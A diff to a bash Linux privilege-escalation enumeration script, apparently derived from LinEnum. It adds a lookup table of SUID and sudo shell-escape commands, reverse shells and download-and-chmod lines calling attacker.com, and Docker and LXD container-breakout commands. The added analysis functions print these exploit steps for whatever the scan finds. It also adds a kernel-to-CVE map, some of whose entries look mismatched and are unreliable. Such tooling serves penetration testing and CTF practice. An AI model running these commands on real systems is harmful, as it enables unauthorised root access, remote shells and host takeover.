@@ -71,6 +71,21 @@ CAN_SUDO=0
 CURRENT_USER=$(whoami 2>/dev/null || echo "unknown")
 CURRENT_UID=$(id -u 2>/dev/null || echo "999")
 
+#=============================================================================
+# PRIVILEGE ESCALATION CACHE (stores findings from enumeration phase)
+#=============================================================================
+declare -a CACHED_SUID_FILES
+declare -a CACHED_SUID_BINARIES
+CACHED_SUDO_OUTPUT=""
+CACHED_CAPABILITIES=""
+CACHED_WRITABLE_CRONS=""
+CACHED_WRITABLE_SERVICES=""
+IN_DOCKER_GROUP=0
+IN_LXD_GROUP=0
+IN_DOCKER_CONTAINER=0
+CACHED_PATH="$PATH"
+CACHED_KERNEL_VERSION=""
+
 # Detect user privilege level
 detect_privileges() {
     # Check if running as root
@@ -561,6 +576,92 @@ debug_info() {
 binarylist='aria2c\|arp\|ash\|awk\|base64\|bash\|busybox\|cat\|chmod\|chown\|cp\|csh\|curl\|cut\|dash\|date\|dd\|diff\|dmsetup\|docker\|ed\|emacs\|env\|expand\|expect\|file\|find\|flock\|fmt\|fold\|ftp\|gawk\|gdb\|gimp\|git\|grep\|head\|ht\|iftop\|ionice\|ip$\|irb\|jjs\|jq\|jrunscript\|ksh\|ld.so\|ldconfig\|less\|logsave\|lua\|make\|man\|mawk\|more\|mv\|mysql\|nano\|nawk\|nc\|netcat\|nice\|nl\|nmap\|node\|od\|openssl\|perl\|pg\|php\|pic\|pico\|python\|readelf\|rlwrap\|rpm\|rpmquery\|rsync\|ruby\|run-parts\|rvim\|scp\|script\|sed\|setarch\|sftp\|sh\|shuf\|socat\|sort\|sqlite3\|ssh$\|start-stop-daemon\|stdbuf\|strace\|systemctl\|tail\|tar\|taskset\|tclsh\|tee\|telnet\|tftp\|time\|timeout\|ul\|unexpand\|uniq\|unshare\|vi\|vim\|watch\|wget\|wish\|xargs\|xxd\|zip\|zsh'
 
 #=============================================================================
+# PRIVILEGE ESCALATION EXPLOIT DATABASES
+#=============================================================================
+
+# Expanded GTFOBins database - 50+ exploitable binaries
+declare -A GTFO_SUID_EXPLOITS
+GTFO_SUID_EXPLOITS=(
+    ["find"]="find . -exec /bin/sh -p \\; -quit"
+    ["vim"]="vim -c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
+    ["vi"]="vi -c ':!sh -p' -c ':q'"
+    ["nmap"]="nmap --interactive\\nnmap> !sh -p"
+    ["awk"]="awk 'BEGIN {system(\"/bin/sh -p")}'"
+    ["perl"]="perl -e 'exec \"/bin/sh\";'"
+    ["python"]="python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
+    ["python3"]="python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
+    ["ruby"]="ruby -e 'exec \"/bin/sh -p\"'"
+    ["less"]="less /etc/profile\\n!/bin/sh -p"
+    ["more"]="more /etc/profile\\n!/bin/sh -p"
+    ["nano"]="nano\\n^R^X\\nreset; sh -p 1>&0 2>&0"
+    ["cp"]="cp /bin/sh /tmp/sh && chmod +s /tmp/sh && /tmp/sh -p"
+    ["mv"]="mv /bin/sh /tmp/sh && chmod +s /tmp/sh && /tmp/sh -p"
+    ["tar"]="tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
+    ["zip"]="zip /tmp/x /etc/hosts -T -TT 'sh -p'"
+    ["git"]="git help config\\n!/bin/sh -p"
+    ["docker"]="docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+    ["env"]="env /bin/sh -p"
+    ["ed"]="ed\\n!/bin/sh -p"
+    ["node"]="node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]});'"
+    ["bash"]="bash -p"
+    ["sh"]="sh -p"
+    ["dash"]="dash -p"
+    ["php"]="php -r 'system(\"/bin/sh -p\");'"
+    ["wget"]="wget http://attacker.com/shell -O /tmp/shell && chmod +x /tmp/shell"
+    ["curl"]="curl http://attacker.com/shell -o /tmp/shell && chmod +x /tmp/shell"
+    ["nc"]="nc -e /bin/sh -p attacker.com 4444"
+    ["netcat"]="netcat -e /bin/sh -p attacker.com 4444"
+    ["socat"]="socat exec:'sh -p',pty,stderr,setsid,sigint,sane tcp:attacker.com:4444"
+    ["ssh"]="ssh -o ProxyCommand=';sh -p 0<&2 1>&2' x"
+    ["man"]="man man\\n!/bin/sh -p"
+    ["expect"]="expect -c 'spawn /bin/sh -p;interact'"
+    ["ftp"]="ftp\\n!/bin/sh -p"
+    ["gdb"]="gdb -nx -ex '!sh -p' -ex quit"
+    ["lua"]="lua -e 'os.execute(\"/bin/sh -p\")'"
+    ["irb"]="irb\\nexec '/bin/sh -p'"
+    ["mysql"]="mysql -e '\\\\! /bin/sh -p'"
+    ["psql"]="psql -c '\\\\! /bin/sh -p'"
+    ["make"]="make -s --eval=$'x:\\n\\t-'/bin/sh -p'"
+    ["systemctl"]="systemctl enable ../../tmp/shell.service"
+    ["screen"]="screen -D -m /bin/sh -p"
+    ["tmux"]="tmux new-session -d /bin/sh -p"
+    ["strace"]="strace -o /dev/null /bin/sh -p"
+    ["taskset"]="taskset 1 /bin/sh -p"
+    ["time"]="time /bin/sh -p"
+    ["timeout"]="timeout 7d /bin/sh -p"
+    ["watch"]="watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'"
+    ["xargs"]="xargs -a /dev/null sh -p"
+    ["sed"]="sed -n '1e exec sh -p' /etc/hosts"
+    ["grep"]="grep '' /etc/passwd -m 1 -o -a -h -r --line-buffered --binary-files=text -D skip | sh -p"
+    ["rvim"]="rvim -c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
+    ["emacs"]="emacs -Q -nw --eval '(term \"/bin/sh -p\")'"
+    ["gimp"]="gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
+)
+
+# Kernel exploit database - 18 major CVEs
+declare -A KERNEL_EXPLOITS
+KERNEL_EXPLOITS=(
+    ["2.6.22"]="Vmsplice|CVE-2008-0600"
+    ["2.6.32"]="DirtyCOW|CVE-2016-5195"
+    ["2.6.37"]="Full-Nelson|CVE-2010-4258"
+    ["3.2"]="Memodipper|CVE-2012-0056"
+    ["3.8"]="Perf_swevent|CVE-2013-2094"
+    ["3.13"]="OverlayFS|CVE-2015-1328"
+    ["3.14"]="OverlayFS|CVE-2015-8660"
+    ["4.4"]="AF_PACKET|CVE-2016-8655"
+    ["4.8"]="get_rekt|CVE-2017-16995"
+    ["4.10"]="packet_set_ring|CVE-2017-7308"
+    ["4.13"]="eBPF|CVE-2017-16995"
+    ["4.15"]="KASLR/SMEP|CVE-2017-5123"
+    ["5.8"]="OverlayFS|CVE-2021-3493"
+    ["5.11"]="Netfilter|CVE-2021-22555"
+    ["5.13"]="SequoiaFS|CVE-2021-33909"
+    ["3.16"]="eBPF_verifier|CVE-2017-16995"
+    ["1.3.0"]="PwnKit|CVE-2021-4034"
+    ["5.10"]="DirtyPipe|CVE-2022-0847"
+)
+
+#=============================================================================
 # SYSTEM INFO
 #=============================================================================
 system_info() {
@@ -570,6 +671,9 @@ system_info() {
     exec_print "\e[00;31m[-] Kernel information (continued):\e[00m" cat /proc/version
     exec_print "\e[00;31m[-] Specific release information:\e[00m" cat /etc/*-release
     exec_print "\e[00;31m[-] Hostname:\e[00m" hostname
+    
+    # Cache kernel version for privesc analysis
+    CACHED_KERNEL_VERSION=$(uname -r 2>/dev/null)
     
     pause
 }
@@ -631,6 +735,8 @@ user_info() {
             echo -e "\e[00;33m[+] We can sudo without supplying a password!\e[00m"
             echo "$sudoperms"
             echo ""
+            # Cache for privesc analysis
+            CACHED_SUDO_OUTPUT="$sudoperms"
         fi
     fi
     
@@ -693,6 +799,8 @@ job_info() {
     local cronjobwwperms
     cronjobwwperms=$(safe_find /etc/cron* -perm -0002 -type f -exec ls -la {} \; 2>/dev/null)
     print_if_exists "\e[00;33m[+] World-writable cron jobs:\e[00m" "$cronjobwwperms"
+    # Cache for privesc analysis
+    [ -n "$cronjobwwperms" ] && CACHED_WRITABLE_CRONS="$cronjobwwperms"
     
     exec_print "\e[00;31m[-] Anacron jobs:\e[00m" sh -c "ls -la /etc/anacrontab 2>/dev/null; cat /etc/anacrontab 2>/dev/null"
     
@@ -842,13 +950,26 @@ interesting_files() {
     echo ""
     
     # SUID files - OPTIMIZED: use -maxdepth and limit results
+    # Cache results to avoid duplication in privesc analysis
     echo -e "\e[00;31m[-] SUID files (limited to $MAX_FIND_RESULTS):\e[00m"
-    safe_find / -maxdepth "$MAX_FIND_DEPTH" -perm -4000 -type f -exec ls -la {} \;
+    local suid_output
+    suid_output=$(safe_find / -maxdepth "$MAX_FIND_DEPTH" -perm -4000 -type f 2>/dev/null)
+    
+    # Store in cache
+    while IFS= read -r suidfile; do
+        [ -n "$suidfile" ] && CACHED_SUID_FILES+=("$suidfile")
+        [ -n "$suidfile" ] && CACHED_SUID_BINARIES+=("$(basename "$suidfile")")
+    done <<< "$suid_output"
+    
+    # Display with ls -la
+    echo "$suid_output" | while read -r suidfile; do
+        [ -n "$suidfile" ] && ls -la "$suidfile" 2>/dev/null
+    done
     echo ""
     
     # Interesting SUID files
     echo -e "\e[00;31m[-] Checking for interesting SUID binaries...\e[00m"
-    safe_find / -maxdepth "$MAX_FIND_DEPTH" -perm -4000 -type f 2>/dev/null | while read -r suidfile; do
+    for suidfile in "${CACHED_SUID_FILES[@]}"; do
         if echo "$suidfile" | grep -qw "$binarylist"; then
             echo -e "\e[00;33m[+] Interesting SUID: $suidfile\e[00m"
         fi
@@ -861,7 +982,11 @@ interesting_files() {
     echo ""
     
     # Capabilities
-    exec_print "\e[00;31m[-] Files with POSIX capabilities:\e[00m" sh -c "getcap -r / 2>/dev/null || /sbin/getcap -r / 2>/dev/null"
+    local cap_output
+    cap_output=$(getcap -r / 2>/dev/null || /sbin/getcap -r / 2>/dev/null)
+    print_if_exists "\e[00;31m[-] Files with POSIX capabilities:\e[00m" "$cap_output"
+    # Cache for privesc analysis
+    [ -n "$cap_output" ] && CACHED_CAPABILITIES="$cap_output"
     
     pause
     
@@ -930,6 +1055,7 @@ docker_checks() {
     if grep -qi docker /proc/self/cgroup 2>/dev/null || [ -f /.dockerenv ]; then
         echo -e "\e[00;33m[+] Looks like we're in a Docker container\e[00m"
         echo ""
+        IN_DOCKER_CONTAINER=1
     fi
     
     # Are we a Docker host?
@@ -945,6 +1071,7 @@ docker_checks() {
     if id 2>/dev/null | grep -qi docker; then
         echo -e "\e[00;33m[+] We're a member of the docker group!\e[00m"
         echo ""
+        IN_DOCKER_GROUP=1
     fi
     
     # LXC/LXD checks
@@ -956,7 +1083,266 @@ docker_checks() {
     if id 2>/dev/null | grep -qi lxd; then
         echo -e "\e[00;33m[+] We're a member of the lxd group!\e[00m"
         echo ""
+        IN_LXD_GROUP=1
     fi
+    
+    pause
+}
+
+#=============================================================================
+# PRIVILEGE ESCALATION ANALYSIS (aggregates cached findings)
+#=============================================================================
+
+# Analyze kernel for known vulnerabilities
+analyze_kernel_vulns() {
+    [ -z "$CACHED_KERNEL_VERSION" ] && return
+    
+    local kernel_base=$(echo "$CACHED_KERNEL_VERSION" | grep -oE '^[0-9]+\.[0-9]+')
+    local found=0
+    
+    for kver in "${!KERNEL_EXPLOITS[@]}"; do
+        if [[ "$kernel_base" == "$kver" ]]; then
+            local exploit_info="${KERNEL_EXPLOITS[$kver]}"
+            local exploit_name=$(echo "$exploit_info" | cut -d'|' -f1)
+            local cve=$(echo "$exploit_info" | cut -d'|' -f2)
+            echo -e "\e[00;31m[CRITICAL] Kernel Exploit: $exploit_name ($cve)\e[00m"
+            echo -e "\e[00;90m           Kernel: $CACHED_KERNEL_VERSION\e[00m"
+            echo -e "\e[00;33m           Exploit-DB: https://www.exploit-db.com/search?cve=$cve\e[00m"
+            echo ""
+            found=1
+        fi
+    done
+    
+    return $found
+}
+
+# Analyze sudo permissions for exploitable commands
+analyze_sudo_exploits() {
+    [ -z "$CACHED_SUDO_OUTPUT" ] && return 1
+    
+    local found=0
+    
+    # Check for NOPASSWD ALL
+    if echo "$CACHED_SUDO_OUTPUT" | grep -q "NOPASSWD.*ALL"; then
+        echo -e "\e[00;31m[CRITICAL] Sudo ALL commands without password\e[00m"
+        echo -e "\e[00;32m           Command: sudo /bin/bash\e[00m"
+        echo ""
+        found=1
+    fi
+    
+    # Check for specific exploitable binaries
+    for binary in "${!GTFO_SUID_EXPLOITS[@]}"; do
+        if echo "$CACHED_SUDO_OUTPUT" | grep -qE "NOPASSWD.*/$binary"; then
+            echo -e "\e[00;31m[HIGH] Sudo $binary without password\e[00m"
+            echo -e "\e[00;32m       Exploit:\e[00m"
+            echo -e "\e[00;33m       sudo $binary\e[00m"
+            echo -e "\e[00;90m       ${GTFO_SUID_EXPLOITS[$binary]}\e[00m" | sed 's/^/       /'
+            echo ""
+            found=1
+        fi
+    done
+    
+    # Check for LD_PRELOAD
+    if echo "$CACHED_SUDO_OUTPUT" | grep -q "env_keep.*LD_PRELOAD\|env_keep.*LD_LIBRARY_PATH"; then
+        echo -e "\e[00;31m[HIGH] LD_PRELOAD preserved in sudo environment\e[00m"
+        echo -e "\e[00;32m       Create malicious .so: gcc -fPIC -shared -o /tmp/x.so x.c\e[00m"
+        echo -e "\e[00;32m       Execute: sudo LD_PRELOAD=/tmp/x.so <any_sudo_command>\e[00m"
+        echo ""
+        found=1
+    fi
+    
+    return $found
+}
+
+# Analyze SUID binaries for GTFOBins exploits
+analyze_suid_exploits() {
+    [ ${#CACHED_SUID_BINARIES[@]} -eq 0 ] && return 1
+    
+    local found=0
+    
+    for i in "${!CACHED_SUID_FILES[@]}"; do
+        local suidfile="${CACHED_SUID_FILES[$i]}"
+        local binary="${CACHED_SUID_BINARIES[$i]}"
+        
+        if [[ -n "${GTFO_SUID_EXPLOITS[$binary]}" ]]; then
+            echo -e "\e[00;31m[HIGH] Exploitable SUID: $suidfile\e[00m"
+            echo -e "\e[00;32m       Exploit:\e[00m"
+            echo -e "\e[00;33m       ${GTFO_SUID_EXPLOITS[$binary]}\e[00m" | sed 's/^/       /'
+            echo ""
+            found=1
+        fi
+    done
+    
+    return $found
+}
+
+# Analyze PATH for hijacking opportunities
+analyze_path_hijacking() {
+    local found=0
+    
+    # Check for current directory in PATH
+    if echo "$CACHED_PATH" | grep -qE '(^|:)\.($|:)|::'; then
+        echo -e "\e[00;31m[HIGH] Current directory (.) in PATH\e[00m"
+        echo -e "\e[00;32m       Create malicious binary in current directory\e[00m"
+        echo ""
+        found=1
+    fi
+    
+    # Check for writable directories in PATH
+    echo "$CACHED_PATH" | tr ':' '\n' | while read -r pathdir; do
+        if [ -w "$pathdir" ] 2>/dev/null; then
+            echo -e "\e[00;31m[MEDIUM] Writable PATH directory: $pathdir\e[00m"
+            echo -e "\e[00;32m         Place malicious binary (e.g., 'ls') and wait for root execution\e[00m"
+            echo ""
+            found=1
+        fi
+    done
+    
+    return $found
+}
+
+# Analyze capabilities for privilege escalation
+analyze_capabilities() {
+    [ -z "$CACHED_CAPABILITIES" ] && return 1
+    
+    local found=0
+    
+    while IFS= read -r line; do
+        local binary=$(echo "$line" | awk '{print $1}')
+        
+        if echo "$line" | grep -q "cap_setuid"; then
+            echo -e "\e[00;31m[CRITICAL] CAP_SETUID: $binary\e[00m"
+            echo -e "\e[00;32m           Can escalate to root UID\e[00m"
+            echo ""
+            found=1
+        elif echo "$line" | grep -q "cap_dac_read_search"; then
+            echo -e "\e[00;31m[HIGH] CAP_DAC_READ_SEARCH: $binary\e[00m"
+            echo -e "\e[00;32m       Can read any file (e.g., /etc/shadow)\e[00m"
+            echo ""
+            found=1
+        elif echo "$line" | grep -q "cap_sys_admin"; then
+            echo -e "\e[00;31m[HIGH] CAP_SYS_ADMIN: $binary\e[00m"
+            echo -e "\e[00;32m       Can mount filesystems / escape containers\e[00m"
+            echo ""
+            found=1
+        elif echo "$line" | grep -q "cap_sys_ptrace"; then
+            echo -e "\e[00;31m[MEDIUM] CAP_SYS_PTRACE: $binary\e[00m"
+            echo -e "\e[00;32m         Can inject into processes\e[00m"
+            echo ""
+            found=1
+        fi
+    done <<< "$CACHED_CAPABILITIES"
+    
+    return $found
+}
+
+# Analyze cron jobs for writable scripts
+analyze_cron_vectors() {
+    local found=0
+    
+    # Check cached writable crons
+    if [ -n "$CACHED_WRITABLE_CRONS" ]; then
+        echo -e "\e[00;31m[HIGH] Writable cron files found\e[00m"
+        echo "$CACHED_WRITABLE_CRONS" | head -5
+        echo -e "\e[00;32m       Inject reverse shell for root execution\e[00m"
+        echo ""
+        found=1
+    fi
+    
+    # Check for tar wildcard in cron (common CTF vector)
+    if grep -r "tar.*\*" /etc/cron* 2>/dev/null | head -3 | grep -q .; then
+        echo -e "\e[00;31m[MEDIUM] Tar wildcard injection in cron\e[00m"
+        echo -e "\e[00;32m         Create checkpoint files in backup directory\e[00m"
+        echo ""
+        found=1
+    fi
+    
+    return $found
+}
+
+# Analyze container escape vectors
+analyze_container_breakouts() {
+    local found=0
+    
+    if [ "$IN_DOCKER_GROUP" = "1" ]; then
+        echo -e "\e[00;31m[CRITICAL] Docker group membership\e[00m"
+        echo -e "\e[00;32m           docker run -v /:/mnt --rm -it alpine chroot /mnt sh\e[00m"
+        echo ""
+        found=1
+    fi
+    
+    if [ "$IN_LXD_GROUP" = "1" ]; then
+        echo -e "\e[00;31m[CRITICAL] LXD group membership\e[00m"
+        echo -e "\e[00;32m           lxc init ubuntu:18.04 priv -c security.privileged=true\e[00m"
+        echo -e "\e[00;32m           lxc config device add priv host-root disk source=/ path=/mnt/root\e[00m"
+        echo -e "\e[00;32m           lxc start priv && lxc exec priv /bin/sh\e[00m"
+        echo ""
+        found=1
+    fi
+    
+    return $found
+}
+
+# Analyze NFS exports for no_root_squash
+analyze_nfs_exploits() {
+    if ! can_read /etc/exports; then
+        return 1
+    fi
+    
+    if grep -v '^#' /etc/exports 2>/dev/null | grep -q "no_root_squash"; then
+        echo -e "\e[00;31m[HIGH] NFS share with no_root_squash\e[00m"
+        grep "no_root_squash" /etc/exports 2>/dev/null | head -3
+        echo -e "\e[00;32m       Mount from attacker machine as root to create SUID binaries\e[00m"
+        echo ""
+        return 0
+    fi
+    
+    return 1
+}
+
+# Master privilege escalation summary
+privilege_escalation_summary() {
+    echo ""
+    if [ "$QUIET_MODE" = "1" ]; then
+        echo "============================================================"
+        echo "      PRIVILEGE ESCALATION ANALYSIS"
+        echo "============================================================"
+    else
+        echo -e "\e[00;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[00m"
+        echo -e "\e[00;35m         ⚠️  PRIVILEGE ESCALATION VECTORS\e[00m"
+        echo -e "\e[00;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[00m"
+    fi
+    echo ""
+    echo -e "\e[00;33mAggregating findings from enumeration phase...\e[00m"
+    echo ""
+    
+    local vectors_found=0
+    
+    # Run all analysis functions
+    analyze_kernel_vulns && ((vectors_found++))
+    analyze_sudo_exploits && ((vectors_found++))
+    analyze_suid_exploits && ((vectors_found++))
+    analyze_container_breakouts && ((vectors_found++))
+    analyze_capabilities && ((vectors_found++))
+    analyze_path_hijacking && ((vectors_found++))
+    analyze_cron_vectors && ((vectors_found++))
+    analyze_nfs_exploits && ((vectors_found++))
+    
+    # Summary
+    if [ "$vectors_found" -eq 0 ]; then
+        echo -e "\e[00;32m[✓] No obvious privilege escalation vectors detected\e[00m"
+        echo -e "\e[00;90m    This doesn't mean the system is secure - manual review recommended\e[00m"
+    else
+        echo -e "\e[00;31m[!] Found $vectors_found potential privilege escalation vector(s)\e[00m"
+        echo -e "\e[00;33m    Review findings above and test exploits in controlled environment\e[00m"
+    fi
+    
+    echo ""
+    echo -e "\e[00;90mResources:\e[00m"
+    echo -e "\e[00;90m  - GTFOBins: https://gtfobins.github.io/\e[00m"
+    echo -e "\e[00;90m  - PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings\e[00m"
+    echo -e "\e[00;90m  - Linux Privilege Escalation: https://github.com/rebootuser/LinEnum\e[00m"
+    echo ""
     
     pause
 }
@@ -1077,7 +1463,8 @@ call_each() {
     software_configs
     interesting_files
     docker_checks
-    version_inventory_report  # Added: Version inspection report (if -i enabled)
+    version_inventory_report  # Version inspection report (if -i enabled)
+    privilege_escalation_summary  # Aggregated privesc analysis from cached findings
     footer
 }
 
